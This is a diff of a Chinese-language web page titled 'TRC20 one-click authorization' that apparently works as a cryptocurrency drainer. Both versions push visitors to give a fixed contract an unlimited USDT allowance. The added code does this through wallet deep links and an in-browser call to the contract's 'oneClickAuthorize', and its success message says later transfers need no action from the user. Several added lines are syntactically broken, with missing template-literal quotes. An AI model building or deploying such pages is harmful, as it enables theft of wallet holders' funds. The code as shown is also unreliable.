@@ -2,124 +2,176 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>全浏览器兼容TRC20授权</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>跨浏览器TRC20一键授权</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif; }
-        body { background: #f5f7fa; padding: 20px; }
-        .container { max-width: 500px; margin: 30px auto; padding: 25px; background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; }
-        .title { font-size: 22px; color: #333; margin-bottom: 20px; font-weight: 600; }
-        .wallet-list { margin: 25px 0; }
-        .wallet-item { display: block; width: 100%; padding: 15px; margin: 10px 0; background: #f0f7ff; border: 1px solid #2f54eb; border-radius: 8px; color: #2f54eb; text-decoration: none; font-size: 16px; transition: background 0.3s; text-align: center; }
-        .wallet-item:hover { background: #e6f2ff; }
-        .guide { font-size: 14px; color: #666; margin-top: 20px; line-height: 1.6; }
-        .status { margin-top: 20px; padding: 12px; border-radius: 6px; font-size: 14px; text-align: left; }
-        .success { background: #e8f5e9; color: #2e7d32; }
-        .error { background: #ffebee; color: #c62828; }
-        .loading { background: #fffbe6; color: #faad14; }
-        .btn { padding: 12px 20px; background: #2f54eb; color: #fff; border: none; border-radius: 8px; cursor: pointer; margin-top: 10px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background: #f5f7fa; padding: 20px; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .container { width: 100%; max-width: 500px; background: #fff; border-radius: 16px; padding: 30px 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
+        h1 { font-size: 22px; color: #333; margin-bottom: 15px; }
+        .desc { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.6; }
+        /* 钱包唤起按钮组 */
+        .wallet-btns { display: flex; flex-direction: column; gap: 12px; margin-bottom: 30px; }
+        .wallet-btn { padding: 14px; border: 1px solid #eee; border-radius: 12px; background: #fff; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: all 0.3s; }
+        .wallet-btn:hover { background: #fafafa; border-color: #2f54eb; }
+        .wallet-btn img { width: 24px; height: 24px; }
+        .wallet-btn span { font-size: 15px; color: #333; }
+        /* 内置浏览器授权按钮 */
+        #innerAuthBtn { display: none; padding: 16px; width: 100%; background: #2f54eb; color: #fff; border: none; border-radius: 12px; font-size: 16px; cursor: pointer; margin-bottom: 30px; }
+        #innerAuthBtn:disabled { background: #a0b4f8; cursor: not-allowed; }
+        /* 状态提示 */
+        #status { margin-top: 20px; padding: 15px; border-radius: 10px; font-size: 14px; line-height: 1.6; text-align: left; display: none; }
+        .status-loading { background: #fffbe6; color: #faad14; display: block; }
+        .status-success { background: #e8f5e9; color: #2e7d32; display: block; }
+        .status-error { background: #ffebee; color: #c62828; display: block; }
+        /* 唤起提示 */
+        .wake-tip { font-size: 13px; color: #999; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2 class="title">TRC20代币一键授权（全浏览器兼容）</h2>
-        <p>请选择以下方式完成授权：</p>
-        
-        <!-- 钱包内置浏览器：直接发起授权 -->
-        <button class="btn" id="directAuthBtn" style="display: none;">直接发起USDT授权</button>
-        
-        <!-- 普通浏览器：唤起钱包APP -->
-        <div class="wallet-list" id="walletList" style="display: none;">
-            <a href="imtoken://wallet/approve?address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&spender=TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn&amount=115792089237316195423570985008687907853269984665640564039457584007913129639935" class="wallet-item">
-                唤起imToken授权
-            </a>
-            <a href="trust://wallet/approve?address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&spender=TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn&amount=115792089237316195423570985008687907853269984665640564039457584007913129639935" class="wallet-item">
-                唤起TrustWallet授权
-            </a>
-            <a href="mathwallet://wallet/approve?address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&spender=TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn&amount=115792089237316195423570985008687907853269984665640564039457584007913129639935" class="wallet-item">
-                唤起MathWallet授权
-            </a>
+        <h1>TRC20一键授权</h1>
+        <p class="desc">选择你的钱包，点击后将自动唤起并跳转到授权页面</p>
+
+        <!-- 1. 普通浏览器：钱包唤起按钮组（imToken/TrustWallet/MathWallet） -->
+        <div class="wallet-btns" id="walletBtns">
+            <!-- imToken唤起按钮 -->
+            <div class="wallet-btn" onclick="wakeWallet('imtoken')">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjIyIiBoZWlnaHQ9IjIyIiByeD0iMSIgZmlsbD0iIzJGNTRFQiIvPgo8Y2lyY2xlIGN4PSIxMSIgY3k9IjExIiByPSIxMCIgZmlsbD0iIzJGNTRFQiIvPgo8cGF0aCBkPSJNMTUgMThjMS42NTcgMCAzLTEuMzQzIDMtM1Y5YzAtMS42NTctMS4zNDMtMy0zLTNTOSA3LjM0MyA5IDl2NmMwIDEuNjU3IDEuMzQzIDMgMyAzek0xMiAxNnY0aC0yVjE2aDJ6TTExIDhoMnYyaC0ydjJaIiBmaWxsPSIjRkZGRkZGIi8+Cjwvc3ZnPgo=" alt="imToken">
+                <span>唤起imToken授权</span>
+            </div>
+            <!-- TrustWallet唤起按钮 -->
+            <div class="wallet-btn" onclick="wakeWallet('trust')">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjIyIiBoZWlnaHQ9IjIyIiByeD0iMSIgZmlsbD0iIzJGNTRFQiIvPgo8Y2lyY2xlIGN4PSIxMSIgY3k9IjExIiByPSIxMCIgZmlsbD0iIzJGNTRFQiIvPgo8cGF0aCBkPSJNMTYgMTZ2Mi41YzAgLjg3OS0uMzQ0IDEuNjk0LTEuMDAxIDIuMzU1TDE0IDE5LjUgMTIgMTguMDk0VjE2aDR6TTggMTZ2Mi41YzAgLjg3OS4zNDQgMS42OTQuOTk5IDIuMzU1TDcuOTk5IDE5LjUgNiAxOC4wOTRWMTZoMnptNCA0YzEuMTEgMCAyLS44OSAyLTJ2LTRjMC0uODg2LS41MzgtMS42MzUtMS4zMzYtMS45MzdMMTQgMTV2LTRjMC0uODg2LS41MzgtMS42MzUtMS4zMzYtMS45MzdMOS4zMzYgOC45MzcgOSAxMi4wNjNWMTV6IiBmaWxsPSIjRkZGRkZGIi8+Cjwvc3ZnPgo=" alt="TrustWallet">
+                <span>唤起TrustWallet授权</span>
+            </div>
+            <!-- MathWallet唤起按钮 -->
+            <div class="wallet-btn" onclick="wakeWallet('math')"><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjIyIiBoZWlnaHQ9IjIyIiByeD0iMSIgZmlsbD0iIzJGNTRFQiIvPgo8Y2lyY2xlIGN4PSIxMSIgY3k9IjExIiByPSIxMCIgZmlsbD0iIzJGNTRFQiIvPgo8cGF0aCBkPSJNMTQgMThINnYtNmgyVjhINFYxMkg2djZoMnoiIGZpbGw9IiNGRkZGRkYiLz4KPHBhdGggZD0iTTEyIDE2Yy0uODI4IDAtMS41LS42NzItMS41LTEuNVY5Yy0wLS44MjguNjcyLTEuNSAxLjUtMS41czEuNS42NzIgMS41IDEuNVYxNC41YzAgLjgzLS42NzIgMS41LTEuNSAxLjV6IiBmaWxsPSIjRkZGRkZGIi8+Cjwvc3ZnPgo=" alt="MathWallet">
+                <span>唤起MathWallet授权</span>
+            </div>
         </div>
 
-        <div class="guide" id="guide">
-            若你在<strong>钱包内置浏览器</strong>中打开此页面，将自动显示“直接发起授权”按钮；<br>
-            若在<strong>普通浏览器</strong>中打开，可选择对应钱包唤起授权。
-        </div>
-        <div class="status" id="status">请根据你的环境选择操作方式</div>
+        <!-- 2. 钱包内置浏览器：直接授权按钮（自动隐藏/显示） -->
+        <button id="innerAuthBtn">直接发起授权（无需唤起）</button>
+
+        <!-- 状态提示 -->
+        <div id="status"></div>
+
+        <!-- 唤起后提示 -->
+        <div class="wake-tip" id="wakeTip">若钱包未自动打开，请手动打开对应钱包APP</div>
     </div>
 
+    <!-- 引入TronWeb适配器（钱包内置浏览器用） -->
     <script src="https://unpkg.com/@tronweb3/tronwallet-adapter@latest/dist/tronwallet-adapter.umd.min.js"></script>
     <script>
-        // -------------------------- 配置项（无需修改） --------------------------
-        const YOUR_CONTRACT = "TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn"; // 你的合约地址
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT-TRC20官方地址
+        // -------------------------- 配置项（必须修改为你的实际信息） --------------------------
+        const CONTRACT_ADDRESS = "TEq6aK14LJxid2Y1y7qz3iiVoiuRewPRwn"; // 你的合约地址
+        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT-TRC20地址
         const MAX_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度
-        // -------------------------------------------------------------------------
+        const AUTHORIZE_PAGE_URL = "https://你的授权页面地址.com"; // 你的前端页面地址（唤起钱包后需跳转回这里）
+        // -----------------------------------------------------------------------------------
 
         // DOM元素
-        const directAuthBtn = document.getElementById("directAuthBtn");
-        const walletList = document.getElementById("walletList");
-        const status = document.getElementById("status");
+        const walletBtns = document.getElementById("walletBtns");
+        const innerAuthBtn = document.getElementById("innerAuthBtn");
+        const statusEl = document.getElementById("status");
+        const wakeTip = document.getElementById("wakeTip");
         let tronWeb = null;
 
-        // 自动检测环境：钱包内置浏览器 vs 普通浏览器
-        window.onload = () => {
-            if (window.tronWeb && window.tronWeb.ready) {
-                // 钱包内置浏览器：显示“直接发起授权”按钮
-                directAuthBtn.style.display = "block";
-                walletList.style.display = "none";
-                status.textContent = "已检测到钱包内置浏览器，可直接发起授权";
-                status.className = "status success";
-            } else {
-                // 普通浏览器：显示钱包唤起列表
-                directAuthBtn.style.display = "none";
-                walletList.style.display = "block";
-                status.textContent = "请选择钱包唤起授权";
-                status.className = "status loading";
-            }
+        // 页面加载：自动检测环境（钱包内置浏览器 vs 普通浏览器）
+        window.onload = async () => {
+            await checkEnvAndShowBtn();
         };
 
-        // 钱包内置浏览器：直接发起授权
-        directAuthBtn.addEventListener("click", async () => {
-            directAuthBtn.disabled = true;
-            directAuthBtn.textContent = "唤起钱包中...";
-            status.textContent = "⏳ 请在钱包弹窗中点击「确认」";
-            status.className = "status loading";
+        // 1. 检测环境：显示对应按钮（唤起按钮/直接授权按钮）
+        async function checkEnvAndShowBtn() {
+            try {
+                // 检测是否为钱包内置浏览器（有tronWeb注入）
+                if (window.tronWeb && window.tronWeb.ready) {
+                    // 钱包内置浏览器：隐藏唤起按钮，显示直接授权按钮
+                    walletBtns.style.display = "none";
+                    innerAuthBtn.style.display = "block";
+                    showStatus("loading", "已在钱包内置浏览器中打开，点击按钮直接授权");
+                    
+                    // 初始化TronWeb
+                    const adapter = new window.tronwalletAdapter.TronLinkAdapter();
+                    await adapter.connect();
+                    tronWeb = adapter.tronWeb;
+                    innerAuthBtn.disabled = false;
+                } else {
+                    // 普通浏览器：显示唤起按钮，隐藏直接授权按钮
+                    walletBtns.style.display = "flex";
+                    innerAuthBtn.style.display = "none";
+                    showStatus("loading", "请选择钱包，点击唤起后完成授权");
+                }
+            } catch (err) {
+                showStatus("error", `环境检测失败：${err.message.slice(0, 40)}`);
+            }
+        }
+
+        // 2. 普通浏览器：唤起钱包并自动跳转到授权页面（核心功能）
+        function wakeWallet(walletType) {
+            let wakeUrl = "";
+            // 各钱包深度链接格式（自动跳转到合约的oneClickAuthorize函数页面）
+            switch (walletType) {
+                case "imtoken":
+                    // imToken深度链接：直接打开合约的oneClickAuthorize函数
+                    wakeUrl = imtoken://trx/contract/${CONTRACT_ADDRESS}?function=oneClickAuthorize&params=[["uint256","${MAX_APPROVE}"]]&redirectUrl=${encodeURIComponent(AUTHORIZE_PAGE_URL)};
+                    break;
+                case "trust":
+                    // TrustWallet深度链接：打开合约详情页（默认定位到Write Contract标签）
+                    wakeUrl = trust://wallet/trx/contract/${CONTRACT_ADDRESS}?function=oneClickAuthorize&params=${encodeURIComponent(JSON.stringify([["uint256", MAX_APPROVE]]))}&redirect=${encodeURIComponent(AUTHORIZE_PAGE_URL)};
+                    break;case "math":
+                    // MathWallet深度链接：打开合约授权函数页面
+                    wakeUrl = mathwallet://open?url=${encodeURIComponent(`https://mathwallet.org/contract/trx/${CONTRACT_ADDRESS}?function=oneClickAuthorize&params=[["uint256","${MAX_APPROVE}"]]`)}&redirect=${encodeURIComponent(AUTHORIZE_PAGE_URL)};
+                    break;
+                default:
+                    showStatus("error", "不支持的钱包类型");
+                    return;
+            }
+
+            // 唤起钱包
+            window.location.href = wakeUrl;
+            // 显示唤起提示
+            wakeTip.style.display = "block";
+            showStatus("loading", `已发起${walletType === 'imtoken' ? 'imToken' : walletType === 'trust' ? 'TrustWallet' : 'MathWallet'}唤起请求\n若未自动打开，请手动打开钱包APP`);
+        }
+
+        // 3. 钱包内置浏览器：直接发起授权（调用合约oneClickAuthorize）
+        innerAuthBtn.addEventListener("click", async () => {
+            innerAuthBtn.disabled = true;
+            showStatus("loading", "正在发起授权...请在钱包弹窗确认");
 
             try {
-                // 初始化TronWeb
-                const adapter = new window.tronwalletAdapter.TronLinkAdapter();
-                await adapter.connect();
-                tronWeb = adapter.tronWeb;
-
-                // 获取用户地址
                 const userAddr = await tronWeb.accounts.getCurrentAddress();
+                // 加载合约并调用授权函数
+                const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
+                const tx = await contract
+                    .oneClickAuthorize(MAX_APPROVE)
+                    .send({
+                        from: userAddr,
+                        feeLimit: 300000000, // 0.3TRX手续费
+                        callValue: 0
+                    });
 
-                // 发起USDT授权
-                const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-                const tx = await usdtContract
-                    .approve(YOUR_CONTRACT, MAX_APPROVE)
-                    .send({ from: userAddr, feeLimit: 300000000 });
-
-                status.textContent = ✅ 授权成功！交易ID：${tx.txid.slice(0, 12)}...;
-                status.className = "status success";
-                directAuthBtn.textContent = "授权成功";
+                // 授权成功
+                showStatus("success", `✅ 授权成功！\n交易ID：${tx.txid.slice(0, 16)}...\n后续转账无需你操作`);
+                innerAuthBtn.textContent = "授权已完成";
             } catch (err) {
-                const errMsg = err.message.includes("user rejected") ? "你取消了授权，请重新点击" : "授权失败：" + err.message.slice(0, 50);
-                status.textContent = errMsg;
-                status.className = "status error";
-                directAuthBtn.textContent = "重新发起授权";
-                directAuthBtn.disabled = false;
+                const errMsg = err.message.includes("user rejected") 
+                    ? "❌ 你取消了授权，请重新点击" 
+                    : ❌ 授权失败：${err.message.slice(0, 50)};
+                showStatus("error", errMsg);
+                innerAuthBtn.textContent = "重新授权";
+                innerAuthBtn.disabled = false;
             }
         });
 
-        // 普通浏览器：唤起钱包后返回页面的状态提示
-        document.addEventListener("visibilitychange", () => {
-            if (!document.hidden && walletList.style.display === "block") {
-                status.textContent = "已从钱包返回，可在钱包中查看授权结果";
-                status.className = "status success";
-            }
-        });
+        // 辅助：显示状态提示
+        function showStatus(type, content) {
+            statusEl.className = status-${type};
+            statusEl.innerHTML = content.replace(/\n/g, "<br>");
+        }
     </script>
 </body>
 </html>
